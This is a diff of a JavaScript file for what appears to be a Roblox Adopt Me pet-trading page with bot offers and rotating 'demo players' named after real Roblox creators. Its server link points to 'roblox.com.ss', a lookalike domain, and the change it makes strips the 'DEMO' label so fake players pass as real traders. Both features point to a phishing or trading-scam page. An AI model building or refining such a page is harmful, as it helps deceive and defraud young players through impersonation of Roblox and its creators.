@@ -246,7 +246,7 @@ const PRIVATE_SERVER_URL="https://www.roblox.com.ss/games/920587237/3H-Adopt-Me?
 let pets=[];
 const demoPlayers=[{"username":"glitterpuff302","name":"Uneasy"},{"username":"NotLeah","name":"NotLeah"},{"username":"RealKreek","name":"RealKreek"},{"username":"FunnehCake","name":"FunnehCake"}];
 let activePlayerIndex=-1;
-function setNextDemoPlayer(){activePlayerIndex=(activePlayerIndex+1)%demoPlayers.length;const p=demoPlayers[activePlayerIndex];$("player-avatar").src="/api/avatar?username="+encodeURIComponent(p.username);$("player-avatar").alt=p.name+" demo avatar";$("player-name").textContent=p.name;$("player-handle").textContent="@"+p.username+" · PLAYER · DEMO";}
+function setNextDemoPlayer(){activePlayerIndex=(activePlayerIndex+1)%demoPlayers.length;const p=demoPlayers[activePlayerIndex];$("player-avatar").src="/api/avatar?username="+encodeURIComponent(p.username);$("player-avatar").alt=p.name+" demo avatar";$("player-name").textContent=p.name;$("player-handle").textContent="@"+p.username+" · PLAYER";}
 let selectedTrader="CRAZYMADDOG01",myOffer=[],botOffer=[],filter="All";
 const $=id=>document.getElementById(id),sum=a=>a.reduce((n,p)=>n+p.value,0),pet=n=>pets.find(p=>p.name===n);
 
